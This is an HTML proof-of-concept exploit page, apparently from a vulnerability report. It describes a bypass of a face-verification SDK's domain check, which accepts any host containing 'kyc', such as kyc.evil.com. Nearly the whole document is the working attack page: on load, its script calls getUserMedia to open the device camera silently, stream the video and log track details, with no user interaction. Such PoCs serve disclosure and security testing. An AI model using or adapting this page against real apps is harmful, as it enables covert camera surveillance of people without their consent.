<!doctype html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="icon" href="data:,">
<title>PoC - Camera</title>
<style>
    :root{--paper:rgba(255,250,242,.96);--ink:#241d18;--muted:#71675f;--border:#d8c7b1;--a:#bf552d;--shadow:rgba(66,43,24,.08)}
    *{box-sizing:border-box}
    body{margin:0;min-height:100vh;font-family:"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;color:var(--ink);background:linear-gradient(180deg,#f7f0e4 0%,#efe7da 100%)}
    .wrap{max-width:640px;margin:0 auto;padding:24px 16px 40px}
    .panel{background:var(--paper);border:1px solid var(--border);border-radius:22px;box-shadow:0 18px 45px var(--shadow);padding:18px;margin-bottom:18px}
    .panel h2{margin:0 0 12px}
    .card{padding:14px;border:1px solid var(--border);border-radius:16px;background:#fff;margin-bottom:14px}
    .card h3{margin:0 0 10px}
    .status{display:inline-block;padding:4px 10px;border-radius:999px;font-size:12px;font-weight:700;background:#ece4d8;color:#584d45}
    .status-ok{background:#d4edda;color:#155724}
    .status-err{background:#f8d7da;color:#721c24}
    pre{margin:0;white-space:pre-wrap;word-break:break-word;max-height:300px;overflow:auto;padding:14px;border:1px solid #3f372f;border-radius:14px;background:#0f0d0c;color:#f7f2eb;font-family:Consolas,"SFMono-Regular",Menlo,monospace;font-size:12px;line-height:1.6}
    video{width:100%;min-height:300px;object-fit:cover;border-radius:14px;background:#000}
</style>
</head>
<body>
<div class="wrap">

    <section class="panel">
        <h2>PoC — 静默摄像头</h2>
        <p style="color:var(--muted);line-height:1.7;margin:0">
            域名校验绕过：<code>WBH5FaceVerifySDK.c()</code> 使用 <code>contains("kyc")</code> 校验，<code>kyc.evil.com</code> 即可绕过。<br>
            <code>getUserMedia({video:true})</code> 静默打开摄像头，实时展示画面，无需用户交互。
        </p>
    </section>

    <section class="panel">
        <h2>摄像头实时画面 <span class="status" id="camStatus">starting</span></h2>
        <div class="card">
            <video id="vid" autoplay playsinline muted></video>
        </div>
        <div class="card">
            <h3>摄像头信息</h3>
            <pre id="camOutput">requesting...</pre>
        </div>
    </section>

    <section class="panel">
        <h2>日志</h2>
        <pre id="log">initializing...</pre>
    </section>
</div>

<script>
var $=function(id){return document.getElementById(id)};
var now=function(){return new Date().toISOString()};

function log(m,d){
    var line='['+now()+'] '+m;
    var payload=d===undefined?'':'\n'+(typeof d==='string'?d:JSON.stringify(d,null,2));
    var el=$('log');
    el.textContent=line+payload+'\n\n'+(el.textContent==='initializing...'?'':el.textContent);
}

function setStatus(id,text,ok){
    var el=$(id);
    el.textContent=text;
    el.className=ok===true?'status status-ok':ok===false?'status status-err':'status';
}

(function(){
    log('getUserMedia: requesting camera (silent, no user interaction)');
    if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia){
        setStatus('camStatus','unsupported',false);
        $('camOutput').textContent='mediaDevices API not available';
        log('mediaDevices not available');
        return;
    }
    navigator.mediaDevices.getUserMedia({
        video:{facingMode:'environment'},
        audio:false
    }).then(function(stream){
        var vid=$('vid');
        vid.srcObject=stream;
        vid.play();
        setStatus('camStatus','streaming',true);
        var tracks=stream.getVideoTracks();
        var info={
            status:'streaming (silent)',
            trackCount:tracks.length,
            tracks:tracks.map(function(t){
                var s=t.getSettings?t.getSettings():{};
                return{label:t.label,id:t.id,width:s.width,height:s.height,frameRate:s.frameRate,facingMode:s.facingMode};
            })
        };
        $('camOutput').textContent=JSON.stringify(info,null,2);
        log('camera SUCCESS - streaming silently',info);
    }).catch(function(err){
        setStatus('camStatus','failed',false);
        var r={error:err.name,message:err.message};
        $('camOutput').textContent=JSON.stringify(r,null,2);
        log('camera FAILED',r);
    });
})();

log('page loaded',{href:location.href,userAgent:navigator.userAgent});
</script>
</body>
</html>
